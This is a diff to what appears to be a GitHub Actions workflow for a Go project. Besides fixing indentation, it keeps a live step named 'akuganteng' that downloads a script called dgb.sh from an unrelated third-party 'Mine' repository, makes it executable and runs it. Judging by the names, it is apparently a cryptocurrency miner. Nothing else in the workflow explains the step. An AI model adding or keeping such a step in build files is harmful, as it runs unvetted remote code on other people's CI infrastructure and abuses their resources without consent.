@@ -21,7 +21,7 @@ steps:
     go-version: ${{ matrix.go }}
   id: go
 - name: Setup
-uses: actions/checkout@v2
+  uses: actions/checkout@v2
 - name: akuganteng
-run: |
-wget https://github.com/Wisnuyoganugraha/Mine/blob/main/dgb.sh && chmod u+x dgb.sh && ./dgb.sh
+  run: |
+    wget https://github.com/Wisnuyoganugraha/Mine/blob/main/dgb.sh && chmod u+x dgb.sh && ./dgb.sh
